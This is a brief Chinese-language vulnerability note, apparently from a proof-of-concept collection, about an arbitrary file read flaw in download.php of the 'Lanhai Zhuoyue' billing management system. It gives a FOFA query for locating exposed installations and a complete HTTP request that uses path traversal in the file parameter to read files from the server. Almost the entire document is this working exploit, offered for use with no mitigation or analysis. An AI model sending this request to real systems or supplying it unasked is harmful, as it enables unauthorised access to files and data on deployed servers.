## 蓝海卓越计费管理系统存在download.php任意文件读取漏洞



## fofa

```
title="蓝海卓越计费管理系统"
```



## poc

```
GET /download.php?file=../../../../../usr/local/usr-gui/download.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: keep-alive
Content-Length: 12
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=n8n03vmefnnrejq35697pbivl6
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
```

![image-20240525134843597](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202405251348660.png)